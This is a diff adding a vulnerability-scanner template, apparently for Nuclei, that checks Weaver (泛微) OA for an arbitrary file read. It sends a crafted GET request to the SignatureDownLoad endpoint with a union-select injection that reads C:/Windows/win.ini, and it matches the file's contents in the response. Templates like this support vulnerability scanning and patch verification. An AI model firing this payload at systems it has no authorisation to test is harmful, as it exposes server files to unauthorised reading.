@@ -1,0 +1,21 @@
+id: poc-yaml-weaver-signature-download-arbitrary-file-read
+info:
+  name: "泛微OA SignatureDownLoad 接口任意文件读取"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 泛微OA
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=1+union+select+'C:/Windows/win.ini'"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "; for 16-bit app support"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
